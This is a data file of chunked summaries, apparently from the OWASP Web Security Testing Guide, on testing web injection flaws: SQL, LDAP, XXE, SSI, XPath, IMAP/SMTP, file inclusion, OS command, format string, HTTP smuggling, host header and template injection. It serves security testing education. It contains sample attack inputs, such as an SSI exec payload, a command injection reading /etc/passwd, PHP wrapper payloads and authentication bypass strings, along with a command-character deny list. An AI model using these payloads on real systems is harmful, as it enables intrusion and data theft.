{"id": "WSTGv4_2-00116", "source": "wstg-v4.2_knowledge.json", "start_item": 2016, "end_item": 2031, "text": " for various databases includes:\nMySQL: abc' INTO OUTFILE --\nPostgreSQL: $$='$$=chr(61)\nOracle: ```code NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337>1')),'1')!='1' ```\nMS SQL: 1<LEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)\nThe Laravel Query-Builder was also found to be vulnerable in 2019.\nReferences include Wikipedia on ORM and various HITB16 conference materials.\nClient-side SQL injection occurs when an application uses the Web SQL Database technology improperly, failing to validate input or parameterize query variables.\nJavaScript API calls, such as openDatabase(), are used to manipulate the Web SQL Database.\nTesting objectives include validating that proper input validation is conducted to prevent unauthorized access to the database.\nAPI calls associated with Web SQL DB include openDatabase(), transaction(), and executeSQL().\nExample code demonstrates the use of openDatabase() to create or open an existing database: `var db = openDatabase(shortName, version, displayName, maxSize);`\nSQL injection can occur through the executeSQL() method if not properly handled, allowing attackers to read or modify database entries.\nExample of an exploitation scenario: an attacker can modify the URL fragment to extract or manipulate data via SQL injection by using payload like '15 OR 1=1'.\nRemediation methods for SQL Injection should follow the guidelines provided in the Testing for SQL Injection’s Remediation Section.\nReference materials include W3C Web SQL Database, Apple's JavaScript Database Tutorial, Tutorialspoint HTML5 Web SQL Database, and Portswigger’s Client-Side SQL Injection.\nLDAP is used to store information about users, hosts, and other objects.\nLDAP injection is a server-side attack that can disclose, modify, or insert sensitive information.\nThe main goal of LDAP injection attacks is to manipulate input parameters passed to LDAP functions.\nRFC 2254 defines the grammar for building search filters in LDAPv3.\nLDAP search filters use Polish notation for conditions, reformatting conditions into a specific prefix format."}
{"id": "WSTGv4_2-00117", "source": "wstg-v4.2_knowledge.json", "start_item": 2032, "end_item": 2046, "text": "ion attacks is to manipulate input parameters passed to LDAP functions.\nRFC 2254 defines the grammar for building search filters in LDAPv3.\nLDAP search filters use Polish notation for conditions, reformatting conditions into a specific prefix format.\nMetacharacters are used to construct complex LDAP search filters: '&' for AND, '|' for OR, '!' for NOT, '=' for equals, '~=' for approx, '>=' for greater than, '<=' for less than, '*' for any character, and '()' for grouping.\nSuccessful LDAP injection exploitation can lead to unauthorized content access.\nEvade application restrictions and gather unauthorized information by manipulating LDAP queries.\nTest objectives include identifying LDAP injection points and assessing the severity of the injection.\nExample 1 illustrates how to exploit a search filter in LDAP for unauthorized data retrieval using the HTTP request format.\nDemonstrates the impact of replacing user input with a wildcard character (*) in LDAP search filters.\nExample 2 shows how LDAP injection can be used to bypass authentication, similar to SQL and XPATH injection methods.\nAn example LDAP search login filter is given, showcasing how injecting specific values can create a true condition for authentication.\nXML Injection testing involves injecting an XML document into an application to test its security against improper data validation.\nIf the XML parser fails to validate data contextually, it indicates a vulnerability (positive test result).\nKey test objectives include: identifying XML injection points and assessing the potential exploits and their severities.\nThe testing methodology includes understanding XML style communications, inserting XML metacharacters, and attempting to inject XML data and tags.\nAn example XML structure used in registration includes users with usernames, passwords, and email addresses to illustrate a typical XML database layout.\nThe page discusses a specific example of XML injection testing, including a sample URI for adding users to an application.\nThe resulting XML structure shows how user data is stored, highlighting potential security vulnerabilities in XML handling."}
{"id": "WSTGv4_2-00118", "source": "wstg-v4.2_knowledge.json", "start_item": 2047, "end_item": 2060, "text": "ut.\nThe page discusses a specific example of XML injection testing, including a sample URI for adding users to an application.\nThe resulting XML structure shows how user data is stored, highlighting potential security vulnerabilities in XML handling.\nXML metacharacters can lead to injection vulnerabilities if not properly sanitized during XML parsing.\nAn example illustrates how an injection with a single quote can result in a malformed XML document. Code and table formats are provided to clarify concepts.\nDouble quotes can be used as attribute delimiters in XML, but if the value contains an unescaped double quote, it results in a malformed XML document.\nAngular parentheses, when opened or closed within user input, can lead to invalid XML by creating malformed nodes, as illustrated with an example using a username.\nComment tags (e.g., <!--/-->) can also be injected into the XML, leading to invalid construction if they disrupt the structure of the XML nodes, as shown with an example.\nThe ampersand (&) in XML syntax is used to represent entities, with the format &symbol; mapping to characters in Unicode, enabling special character representation. An example illustrates the correct usage of entities for valid XML.\nXML injection can occur if input is not properly encoded, such as using &foo without encoding it as &amp;.\nCreating nodes in XML can allow for injection attacks if not handled properly.\nCDATA sections prevent parsing of specific characters as markup, allowing for the inclusion of text like <foo> without conflict.\nImproperly closed or malformed CDATA sections can lead to invalid XML fragments, e.g., <![CDATA[]]>]]>.\nWhen CDATA sections are processed into HTML, their delimiters can be stripped, potentially allowing for HTML injection.\nAn attacker can exploit XSS vulnerabilities by injecting code using CDATA sections, which can be processed as JavaScript.\nThe CDATA section delimiters are eliminated during processing which leads to execution of the injected script.\nDefinition of external entities in XML can lead to XML eXternal Entity (XXE) attacks, which can expose local files and services to unauthorized access."}
{"id": "WSTGv4_2-00119", "source": "wstg-v4.2_knowledge.json", "start_item": 2061, "end_item": 2076, "text": "ction delimiters are eliminated during processing which leads to execution of the injected script.\nDefinition of external entities in XML can lead to XML eXternal Entity (XXE) attacks, which can expose local files and services to unauthorized access.\nTesting for XXE vulnerabilities can involve defining external entities that point to system files or remote resources, potentially leading to denial of service or information exposure.\nSeveral XML injection test cases provided demonstrate how to define external entities targeting different system files.\nDescription of injecting XML data to manipulate application behavior.\nExample of a privilege escalation attack using XML injection.\nSample XML database structure showing users and injected values.\nExplanation that the last occurrence of 'userid' tag determines the user's privileges.\nMention of the requirement for XML validation against a DTD to prevent such attacks.\nPresentation of the Document Type Definition (DTD) for the XML structure.\nThe problem of controlling the value of nodes in an XML document can be addressed by injecting comments to manipulate the structure, which in this example involves modifying a userid node.\nAn example XML database illustrates how the original userid node can be commented out to allow the injected value to be valid, emphasizing compliance with DTD rules.\nVulnerabilities in XML processing can arise when certain Java APIs are not properly configured, making them susceptible to XXE attacks.\nImportant Java APIs which may be vulnerable to XXE include javax.xml.parsers.DocumentBuilder, javax.xml.parsers.SAXParser, and several others listed in the text.\nWhen reviewing source code for XML vulnerabilities, it is crucial to check if the use of docType, external DTD, and external parameter entities are properly restricted.\nJava POI office reader versions under 3.10.1 are vulnerable to XXE.\nIdentification of the POI library version can be done via the JAR filename (e.g., poi-3.8.jar, poi-ooxml-3.8.jar).\nRelevant source code keywords for C related to XXE prevention for libxml2 and libxerces-c include:"}
{"id": "WSTGv4_2-00120", "source": "wstg-v4.2_knowledge.json", "start_item": 2077, "end_item": 2091, "text": " under 3.10.1 are vulnerable to XXE.\nIdentification of the POI library version can be done via the JAR filename (e.g., poi-3.8.jar, poi-ooxml-3.8.jar).\nRelevant source code keywords for C related to XXE prevention for libxml2 and libxerces-c include:\nlibxml2: `xmlCtxtReadMemory`, `xmlCtxtUseOptions`, `xmlParseInNodeContext`, `xmlReadDoc`, `xmlReadFd`, `xmlReadFile`, `xmlReadIO`, `xmlReadMemory`, `xmlCtxtReadDoc`, `xmlCtxtReadFd`, `xmlCtxtReadFile`, `xmlCtxtReadIO`\nlibxerces-c: `XercesDOMParser`, `SAXParser`, `SAX2XMLReader`\nMention of tools such as XML Injection Fuzz Strings from wfuzz tool.\nReferences to relevant materials for further information on XML Injection and XXE attacks.\nWeb servers can use Server-Side Includes (SSI) for embedding small pieces of dynamic code in static HTML pages.\nSSI allows simple tasks to be performed without complex scripting languages.\nCommon SSI directives can include external files, set print web server environment variables, or execute external scripts/commands.\nSSI can lead to Remote Command Execution (RCE), but most servers have the exec directive disabled by default.\nSSI injection vulnerabilities are simpler to exploit than traditional scripting language injection vulnerabilities due to the straightforward nature of SSI directives.\nTo test for SSI injection, user input should be injected with SSI directives, checking whether the server processes them under improper validation.\nIdentify all possible user input vectors including form inputs, headers, and cookies to find SSI injection points and assess input validation.\nThe example shows how to return the value of a variable using the Server Side Includes (SSI) directive: `<!--#echo var=\"VAR\" -->`\nThe include directive can include output from a CGI script or content from a file: `<!--#include virtual=\"FILENAME\" -->`\nTo execute a system command, use the exec directive: `<!--#exec cmd=\"OS_COMMAND\" -->`\nSSI directives can be injected into HTTP headers, which can then be interpreted by the server: `GET / HTTP/1.1 Host: www.example.com Referer: <!--#exec cmd=\"/bin/ps ax\"--> User-Agent: <!--#include virtual=\"/proc/version\"-->`"}
{"id": "WSTGv4_2-00121", "source": "wstg-v4.2_knowledge.json", "start_item": 2092, "end_item": 2107, "text": "xec cmd=\"OS_COMMAND\" -->`\nSSI directives can be injected into HTTP headers, which can then be interpreted by the server: `GET / HTTP/1.1 Host: www.example.com Referer: <!--#exec cmd=\"/bin/ps ax\"--> User-Agent: <!--#include virtual=\"/proc/version\"-->`\nList of tools mentioned for web security testing includes Web Proxy Burp Suite, OWASP ZAP, and grep for string searching.\nReferences provided include server-specific documentation for Nginx, Apache, and IIS regarding Server Side Includes (SSI).\nKey point on exploiting SSI: SSI Injection can be used instead of JavaScript Malware.\nXPath injection testing involves injecting XPath syntax into requests to test vulnerabilities.\nSuccessful XPath injection can lead to unauthorized access or bypassing authentication mechanisms.\nXPath is similar to SQL, as both are used for querying databases, but XPath may be more powerful due to fewer constraints like access control lists (ACLs).\nThe document provides a sample XML file for a user authentication system to illustrate XPath injection testing.\nIdentification of XPath injection points is a key objective in the testing process.\nXPath query example for authentication: `string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())`\nPotential for XPath injection if user input is not filtered: by entering `' or '1' = '1` for both username and password, the query can be altered to always return true.\nIn XPath injection, similar to SQL injection, an initial test involves inputting a single quote (`'`) to look for syntax errors that indicate vulnerabilities.\nBlind XPath Injection can occur when the internal structure of XML data is unknown and insufficient error messages are provided.\nBlind XPath Injection aims to reconstruct the data structure by injecting queries that return single bits of information.\nIMAP/SMTP Injection affects applications that communicate with mail servers, particularly webmail applications.\nThe testing aims to verify the capacity to inject arbitrary IMAP/SMTP commands due to improper data sanitization.\nIMAP/SMTP Injection is more effective if the mail server is not accessible from the Internet, allowing testing to be conducted directly."}
{"id": "WSTGv4_2-00122", "source": "wstg-v4.2_knowledge.json", "start_item": 2108, "end_item": 2123, "text": "The testing aims to verify the capacity to inject arbitrary IMAP/SMTP commands due to improper data sanitization.\nIMAP/SMTP Injection is more effective if the mail server is not accessible from the Internet, allowing testing to be conducted directly.\nInternal mail servers may have different security levels compared to front-end web servers, potentially making them more vulnerable.\nThe injection technique enables a variety of attacks depending on the scope and mail server technology.\nExamples of attacks include exploitation of protocol vulnerabilities, evasion of application restrictions and anti-automation processes, information leaks, and relay/SPAM.\nTesting objectives include identifying IMAP/SMTP injection points and understanding the data flow and deployment structure of the system.\nFigure 1 illustrates the traffic flow in webmail interactions, differentiating between user interactions and direct mail server access.\nImage: img_page298_1.png\nAssess the injection impacts in web security testing.\nTo detect vulnerable parameters, input validation testing is required by sending bogus requests to the server and analyzing the response.\nIn a secure application, erroneous requests should return error messages; in a vulnerable application, they may return an HTTP 200 OK response.\nRequests must match the technology being tested to avoid false positives.\nWhen testing IMAP servers, relevant parameters include authentication, mailbox operations, destination email, subject, disconnection, message body, and attached files.\nManipulation techniques for testing the 'mailbox' parameter with various examples are provided.\nDifferent manipulation examples include assigning null values, substituting with random values, adding extra values, using special characters, and eliminating the parameter altogether.\nTesting the parameter yields three possible results: S1 - returns an error; S2 - no error but operation not realized; S3 - no error and operation realized normally.\nThe application can be vulnerable to IMAP/SMTP injection as indicated by specific responses (S1 and S2).\nAn attacker can modify URL parameters to test for vulnerabilities, as shown in the provided HTTP requests."}
{"id": "WSTGv4_2-00123", "source": "wstg-v4.2_knowledge.json", "start_item": 2124, "end_item": 2137, "text": "error and operation realized normally.\nThe application can be vulnerable to IMAP/SMTP injection as indicated by specific responses (S1 and S2).\nAn attacker can modify URL parameters to test for vulnerabilities, as shown in the provided HTTP requests.\nThe use of URL encoding (e.g., \"%22\") can be leveraged in the injection process.\nSpecific error messages from the server can reveal information about the commands executed and the potential for injection attacks.\nBlind command injection may be necessary to test for certain vulnerabilities (S2), which requires a more complex methodology.\nA systematic testing approach should be adopted, starting from identifying vulnerable parameters (such as 'passed_id') to understanding the data flow in the application.\nProviding unexpected values (e.g., alphabetical instead of numerical) in parameters can generate error messages indicating potential injection vulnerabilities.\nThe Web Security Testing Guide discusses how to analyze non-descriptive error messages to infer possible commands and parameters.\nWhen testing an application for IMAP command injection, if a vulnerable parameter is detected, the tester should deduce commands associated with that functionality, such as the CREATE command.\nCommand injections in an IMAP/SMTP context have two outcomes depending on authentication: injection possible in an unauthenticated state or requires authenticated state.\nCommon IMAP commands available during unauthenticated state include CAPABILITY, NOOP, AUTHENTICATE, LOGIN, and LOGOUT.\nThe typical structure for IMAP/SMTP command injection includes headers, body, and footer for commands, with a specific termination sequence CRLF (%0d%0a).\nAn example request and its possible command injections using the parameter 'message_id' is illustrated, showing how to construct an injection to exploit vulnerabilities.\nThe page discusses web security testing concepts relating to IMAP/SMTP commands.\nIt includes a table with a header and body indicating command injection points.\nThe reference section lists pertinent whitepapers and RFCs related to IMAP/SMTP protocols."}
{"id": "WSTGv4_2-00124", "source": "wstg-v4.2_knowledge.json", "start_item": 2138, "end_item": 2153, "text": "he page discusses web security testing concepts relating to IMAP/SMTP commands.\nIt includes a table with a header and body indicating command injection points.\nThe reference section lists pertinent whitepapers and RFCs related to IMAP/SMTP protocols.\nTesting for Code Injection is aimed at checking if user input can be executed by the web server as dynamic code.\nProper input validation and secure coding processes are critical to protect against code injection attacks.\nTesting objectives include identifying potential injection points and assessing the severity of the injections.\nBlack-Box Testing example includes injecting a malicious URL in PHP which is then processed as part of the included file.\nGray-Box Testing example examines ASP code for user input that can be executed, saving input to a file and executing it afterwards.\nFile Inclusion vulnerability allows an attacker to include a file via user-supplied input without proper validation.\nThis can lead to code execution, Denial of Service (DoS), and sensitive information disclosure.\nLocal file inclusion (LFI) is the process of including files locally present on the server, which can be exploited through unsanitized input.\nExamples of file inclusion vulnerability are commonly found in technologies like PHP, JSP, and ASP.\nTesting for LFI involves checking scripts that take filenames as parameters, looking for unsanitized paths.\nExample URL vulnerable to LFI: `http://vulnerable_host/preview.php?file=example.html`\nAn example of proof-of-concept for LFI: `http://vulnerable_host/preview.php?file=../../../../etc/passwd` to access sensitive files like '/etc/passwd'.\nThe code snippet demonstrates a PHP inclusion vulnerability using user input for file inclusion.\nNull Byte Injection involves using the null character (%00) to bypass restrictions like file extensions in file inclusions.\nPath and Dot Truncation exploits the filename length limit (4096 bytes) in PHP to truncate malicious input, avoiding execution errors due to extension checks.\nLocal File Inclusion (LFI) vulnerabilities can potentially lead to Remote Code Execution (RCE) if the attacker can exploit the vulnerability in specific ways."}
{"id": "WSTGv4_2-00125", "source": "wstg-v4.2_knowledge.json", "start_item": 2154, "end_item": 2167, "text": "tes) in PHP to truncate malicious input, avoiding execution errors due to extension checks.\nLocal File Inclusion (LFI) vulnerabilities can potentially lead to Remote Code Execution (RCE) if the attacker can exploit the vulnerability in specific ways.\nPHP wrappers allow additional functionality around file system functions, including techniques that can escalate LFI vulnerabilities.\nThe PHP Filter wrapper can be used to read the content of files safely, for example, using 'php://filter/convert.base64-encode/resource=FILE' to encode the file content in base64 to prevent execution.\nPHP 7.2.0 introduced a zip wrapper (zip://), which allows manipulating zip files and requires a specific parameter structure for accessing internal file names.\nThe `php:zip://` wrapper allows the execution of files contained in a ZIP archive with no specific extension required.\nAttackers can exploit this by uploading a malicious ZIP file disguised as an avatar image.\nThe procedure to test this vulnerability involves creating a PHP file, compressing it into a ZIP, renaming it, and uploading it to the server.\nThe payload for executing the file in the ZIP archive is `zip://../avatar/target.jpg%23code`, where `%23` is the URL-encoded form of `#`.\nThe `data://text/plain;base64,BASE64_STR` wrapper can execute Base64-encoded PHP code, provided `allow_url_include` is enabled.\nExample PHP code to execute: `<?php phpinfo(); ?>` can be Base64 encoded to `PD9waHAgcGhwaW5mbygpOyA/Pg==` for use in the `data://` payload.\nThe most effective remediation for file inclusion vulnerabilities is to avoid passing user-supplied input to filesystem APIs or enforcing an allow list of files.\nTools mentioned for testing and remediation include LFI Suite and OWASP ZAP.\nFile Inclusion vulnerability allows an attacker to include a file through dynamic file inclusion mechanisms implemented in applications.\nThis vulnerability occurs due to the use of user-supplied input without proper validation.\nConsequences of this vulnerability can include code execution on the server or client-side, denial of service (DoS), and sensitive information disclosure."}
{"id": "WSTGv4_2-00126", "source": "wstg-v4.2_knowledge.json", "start_item": 2168, "end_item": 2185, "text": "ons.\nThis vulnerability occurs due to the use of user-supplied input without proper validation.\nConsequences of this vulnerability can include code execution on the server or client-side, denial of service (DoS), and sensitive information disclosure.\nRemote File Inclusion (RFI) involves including remote files by exploiting vulnerable inclusion procedures in applications, commonly seen in technologies like PHP, JSP, and ASP.\nTesting for RFI involves identifying scripts that take filenames as parameters without proper input validation.\nAn example of vulnerable PHP code demonstrates the risk of RFI by including a user-supplied file without validation.\nRemediation strategies include avoiding user input in filesystem API calls or maintaining an allow list of files that can be included.\nOS command injection allows an attacker to execute OS commands on a web server through a web interface.\nAny un-sanitized web interface is vulnerable to OS command injection attacks.\nTesting objectives include identifying and assessing command injection points.\nExample of a vulnerable URL: `http://sensitive/cgi-bin/userData.pl?doc=user1.txt` can be manipulated to execute commands.\nExample of command injection using semicolon: `http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`\nPOST HTTP request example that can be analyzed for command injection vulnerability.\nThe page discusses the process of testing for OS command injection vulnerabilities.\nAn example POST request is provided for a web application that retrieves public documentation.\nThe request includes headers like Host, Referer, Cookie, and Authorization, indicating what an attacker might manipulate.\nThe output demonstrates successful execution of a command injection, revealing directory contents on a server.\nSpecial characters that can be used for command injection include: | ; & $ > < ' !\nThe page explains how to use command chaining with ';' and '|' in injected commands, which influences execution order.\nCommand chaining using '||' and '&&' to manage command execution flow.\nExample usage of command substitution with `$(cmd)`."}
{"id": "WSTGv4_2-00127", "source": "wstg-v4.2_knowledge.json", "start_item": 2186, "end_item": 2201, "text": "> < ' !\nThe page explains how to use command chaining with ';' and '|' in injected commands, which influences execution order.\nCommand chaining using '||' and '&&' to manage command execution flow.\nExample usage of command substitution with `$(cmd)`.\nList of dangerous APIs that may introduce command injection risks in various programming languages (Java, C/C++, Python, PHP).\nImportance of sanitizing URL and form data to prevent command injection attacks.\nGeneral deny list of characters to block for command injection: | ; & $ > < ' \\ ! >> #\nSpecial characters that need to be escaped or filtered in Windows and Linux to mitigate command injection risks.\nRunning web applications under strict permissions to avoid unauthorized OS command execution.\nExplanation of format string vulnerabilities in server-side code.\nVulnerabilities are especially severe in languages like C and C++ due to unchecked arguments.\nFormat string functions in languages such as Perl, Java, and PHP can also be exploited, though the extent varies.\nThe critical code pattern leading to vulnerabilities involves directly calling string format functions with unsanitized user input.\nProvided code examples in C and Java illustrate how format string injections can occur, along with the potential consequences.\nAssessing the impact of injecting format string conversion specifiers into user-controlled fields can cause undesirable behavior in applications.\nStatic analysis tools such as Flawfinder for C/C++, FindSecurityBugs rule FORMAT_STRING_MANIPULATION for Java, and String formatter Analyzer in phpsa for PHP can help find format string vulnerabilities.\nManual code inspection is necessary for identifying subtle format string vulnerabilities that static analysis tools might miss.\nTesters can fuzz applications using conversion specifiers to determine if the application can handle unexpected input without crashing.\nThe test can be conducted by sending a URL with a user-controlled value containing conversion specifiers, e.g., `https://vulnerable_host/userinfo?username=%25s%25s%25s%25n`.\nIf successful, error responses indicate a vulnerability, such as 'Format specifier '%s'' or 'Segmentation Fault'."}
{"id": "WSTGv4_2-00128", "source": "wstg-v4.2_knowledge.json", "start_item": 2202, "end_item": 2215, "text": "a URL with a user-controlled value containing conversion specifiers, e.g., `https://vulnerable_host/userinfo?username=%25s%25s%25s%25n`.\nIf successful, error responses indicate a vulnerability, such as 'Format specifier '%s'' or 'Segmentation Fault'.\nFuzzing tools like wfuzz can automate injection tests.\nThe fuzz.txt file includes different types of inputs: a valid input \"alice\", C-like conversion specifiers, and a Python conversion specifier to access global variables.\nTo utilize wfuzz for testing, a command is provided: `wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ` where `FUZZ` indicates where inputs will be introduced.\nThe output format includes the ID, Response status (like 500 or 200), Lines, Words, Characters and the Payload used for the test, as exemplified in a table layout.\nThe output shows the application’s vulnerabilities to injection attacks using specifiers like %s and %p.\nIncubated vulnerabilities are complex testing methods often referred to as persistent attacks, requiring more than one data validation vulnerability.\nThey are used for conducting 'watering hole' attacks against users of legitimate web applications.\nCharacteristics of incubated vulnerabilities include the need for the attack vector to be persisted and stored in a persistence layer due to weak data validation.\nOnce the attack vector is recalled, it must be executed successfully, such as in an incubated XSS attack requiring weak output validation.\nThese vulnerabilities allow attackers to plant data that can later be exploited by unsuspecting users or components of the system.\nIn penetration testing, incubated attacks can assess the criticality of bugs by building client-side based attacks targeting many victims simultaneously.\nExamples of attack vectors include file upload components that allow uploading corrupted media files, cross-site scripting issues in public forums, and SQL/XPATH Injection that allows uploading content to a database.\nTest objectives include identifying stored injections requiring a recall step and understanding how that recall step could occur.\nExplains the process of Black-Box Testing for web applications."}
{"id": "WSTGv4_2-00129", "source": "wstg-v4.2_knowledge.json", "start_item": 2216, "end_item": 2232, "text": "H Injection that allows uploading content to a database.\nTest objectives include identifying stored injections requiring a recall step and understanding how that recall step could occur.\nExplains the process of Black-Box Testing for web applications.\nDetails an example of exploiting file uploads to execute code on a user's workstation through a web application.\nProvides a code example of Cross-Site Scripting (XSS) vulnerability by injecting JavaScript to capture cookies.\nDescribes how to set up a listener to capture cookies from unsuspecting users visiting a vulnerable page that executes the XSS payload.\nIntroduces SQL Injection and links it to XSS vulnerabilities by injecting JavaScript code into the database.\nDemonstrates an SQL Injection attack by manipulating a database query to include an XSS payload.\nMentions risks associated with misconfigured servers that could lead to unauthorized file uploads and code execution.\nThe ability to change web page contents at the server via vulnerabilities can facilitate attacks on web server pages.\nGray-box testing is similar to white-box testing as previously discussed.\nInput validation is crucial in mitigating vulnerabilities, especially regarding the persistence layer of systems in an enterprise.\nOutput validation is necessary to combat client-side attacks, ensuring tainted data is encoded before displaying it to the client.\nTools for web security testing include XSS-proxy, OWASP Zed Attack Proxy (ZAP), Burp Suite, and Metasploit.\nReferences indicate that incubated attacks combine exploits like XSS or SQL-injection.\nCERT Advisory CA-2000-02 discusses malicious HTML tags in web requests.\nPersistent cross-site scripting vulnerabilities can affect systems like Blackboard Academic Suite.\nThe Web Application Security Consortium published a whitepaper on threat classification related to cross-site scripting.\nIntroduction of HTTP Splitting and HTTP Smuggling as attacks on web applications.\nThe first attack (HTTP splitting) exploits a lack of input sanitization to insert CR and LF characters into HTTP headers, potentially leading to cache poisoning or XSS attacks."}
{"id": "WSTGv4_2-00130", "source": "wstg-v4.2_knowledge.json", "start_item": 2233, "end_item": 2247, "text": "tion of HTTP Splitting and HTTP Smuggling as attacks on web applications.\nThe first attack (HTTP splitting) exploits a lack of input sanitization to insert CR and LF characters into HTTP headers, potentially leading to cache poisoning or XSS attacks.\nThe second attack (HTTP smuggling) utilizes ambiguities in HTTP message parsing by different agents, requiring knowledge about the agents involved.\nTest objectives include assessing the application's vulnerability to HTTP splitting and the communication chain's vulnerability to HTTP smuggling.\nThe definition of a potential attack scenario using user input in HTTP headers, emphasizing the importance of input filtering to prevent CRLF injection.\nAn example of HTTP response demonstrates how input can modify the cache behavior of a web application.\nThe HTTP response chain shows how an attacker can inject data to elicit different responses from the server.\nThe malicious input can result in the web cache serving a 'system down' page to all users if the attack is successful.\nAttackers can use JavaScript snippets in addition to HTTP splitting to perform cross-site scripting attacks.\nVulnerable headers include Location and Set-Cookie, which are likely targets for these types of attacks.\nSuccessful exploitation of HTTP splitting can be complex and requires nuanced attack vectors.\nFactors in successful exploits include header manipulation, caching behavior, and input filtering strategies.\nThe discussion centers around HTTP Smuggling, which exploits different interpretations of HTTP messages by browsers, caches, and firewalls.\nA gray-box scenario allows for more flexible testing, particularly when dealing with URL length limitations.\nIn the context of application firewall bypassing, certain legacy attacks (e.g., directory traversal attacks) can be disguised within larger requests to evade detection.\nThe specific example highlights how an IIS server truncates content beyond 48K bytes, which can be leveraged by attackers to separate requests effectively.\nSeveral crafted HTTP requests are outlined, demonstrating how they can be structured to manipulate server responses and bypass firewalls."}
{"id": "WSTGv4_2-00131", "source": "wstg-v4.2_knowledge.json", "start_item": 2248, "end_item": 2260, "text": "server truncates content beyond 48K bytes, which can be leveraged by attackers to separate requests effectively.\nSeveral crafted HTTP requests are outlined, demonstrating how they can be structured to manipulate server responses and bypass firewalls.\nAttack URLs can bypass firewalls and be executed by IIS due to parsing differences.\nHTTP protocol specifies only one Content-Length header, leading to potential HTTP Smuggling attacks when multiple headers are present.\nDifferent servers may handle multiple Content-Length headers differently, creating opportunities for exploitation.\nHTTP Smuggling does not exploit vulnerabilities in the target web application, making it difficult to convince clients about necessary countermeasures.\nTesting for HTTP Incoming Requests involves monitoring all incoming and outgoing HTTP requests on both the client-side and server-side.\nThe purpose of testing is to identify any unnecessary or suspicious HTTP requests being sent in the background.\nWeb security testing tools like AppScan, BurpSuite, and ZAP function as HTTP Proxies and typically require changes to proxy settings on the client-side.\nMonitoring HTTP requests without changing the client-side setup provides a scenario that is closer to production usage.\nTest objectives include monitoring all incoming/outgoing HTTP requests to inspect for suspicious activity and monitoring HTTP traffic without modifying the user's browser or application framework.\nA reverse proxy setup on the web server is necessary when configuration changes on the browser or client-side application cannot be made.\nFiddler is recommended for Windows platforms to monitor and edit/reply to HTTP requests, while Charles Web Debugging Proxy can be used for Linux.\nThe testing steps include installing Fiddler or Charles on the web server, configuring it as a reverse proxy, capturing HTTP traffic, inspecting that traffic, modifying requests, and replaying those modified requests for further testing.\nPort forwarding is another method to intercept HTTP requests without needing to change client-side settings, with Charles capable of acting as a SOCKS proxy."}
{"id": "WSTGv4_2-00132", "source": "wstg-v4.2_knowledge.json", "start_item": 2261, "end_item": 2277, "text": "that traffic, modifying requests, and replaying those modified requests for further testing.\nPort forwarding is another method to intercept HTTP requests without needing to change client-side settings, with Charles capable of acting as a SOCKS proxy.\nKey steps in using port forwarding include installing the necessary software and configuring it to forward captured traffic from the client-side to the web server port.\nTechnique to monitor network traffic at TCP-level using tools such as TCPDump or WireShark.\nTCPDump or WireShark cannot be used to edit captured traffic or send modified HTTP requests.\nOstinato can be used to replay captured traffic (PCAP) packets.\nTesting steps include: capturing traffic with TCPDump or WireShark, monitoring captured files, editing PCAP files using Ostinato, and replaying HTTP requests.\nFiddler and Charles are recommended tools for capturing and editing HTTP traffic, and they can also replay modified HTTP requests.\nFor HTTPS traffic, Wireshark needs the web server's private key to inspect the message body as it is encrypted.\nList of tools for web security testing includes Fiddler, Charles Web Debugging Proxy, TCPProxy, WireShark, PowerEdit-Pcap, pcapteller, replayproxy, and Ostinato.\nTesting for Host Header Injection is critical as it can lead to serious security issues such as web cache poisoning and unauthorized redirects.\nThe Host header in an HTTP request can direct a web server to a specific virtual host based on its value, leading to vulnerabilities if not validated properly.\nInitial testing for Host header injection involves modifying the Host header with a domain like 'attacker.com' to see if the server processes this input correctly.\nSuccessful injection can result in a 302 redirect to an attacker-controlled domain, as demonstrated with response headers.\nIf direct Host header injection is mitigated, attackers can use the X-Forwarded-Host header as a workaround to achieve similar results.\nDiscussion on client-side output vulnerabilities.\nIntroduction to Web Cache Poisoning and its implications for security.\nExamples of HTTP requests related to web cache poisoning.\nExplains Password Reset Poisoning as a security risk."}
{"id": "WSTGv4_2-00133", "source": "wstg-v4.2_knowledge.json", "start_item": 2278, "end_item": 2293, "text": " similar results.\nDiscussion on client-side output vulnerabilities.\nIntroduction to Web Cache Poisoning and its implications for security.\nExamples of HTTP requests related to web cache poisoning.\nExplains Password Reset Poisoning as a security risk.\nCode snippets illustrating web cache manipulation techniques.\nWeb applications utilize server-side templating technologies like Jinja2, Twig, and FreeMaker for dynamic HTML generation.\nServer-side Template Injection (SSTI) vulnerabilities arise from unsafe embedding of user input in templates, potentially leading to remote code execution on the server.\nFeatures supporting advanced user-supplied markup (e.g., wiki-pages, reviews, CMS systems) may be susceptible to SSTI.\nTemplate engines may employ protections (sandboxing, allow listing) against SSTI vulnerabilities.\nThe example demonstrates a vulnerable function getFilter, where call_user_func executes user-supplied input, highlighting the SSTI risk.\nThe provided example demonstrates the use of Flask and Jinja2 templating engine to handle user input.\nThe code snippet accepts a 'name' parameter and renders an HTML response, showing a potential security vulnerability to XSS and SSTI.\nThe payload '$ curl -g 'http://www.target.com/page?name={{7*7}}'' is designed to test for SSTI vulnerabilities by injecting a template expression which gets executed on the server.\nTest objectives include detecting template injection vulnerability points, identifying the templating engine, and building the exploit.\nSSTI vulnerabilities can exist in plaintext or code context, where user input could be within a template statement or freeform text.\nIt is crucial to construct common template expressions as payloads to identify executed expressions and understand potential vulnerabilities.\nImage: img_page330_1.jpeg\nCommon template expression examples include: `a{{bar}}b`, `a{{7*7}}`, `{var} ${var} {{var}} <%var%> [% var %]`.\nAn extensive template expression test strings/payloads list is recommended for SSTI testing.\nThe process of testing for Server-Side Template Injection (SSTI) involves constructing requests that reveal server responses, such as error messages or blank outputs."}
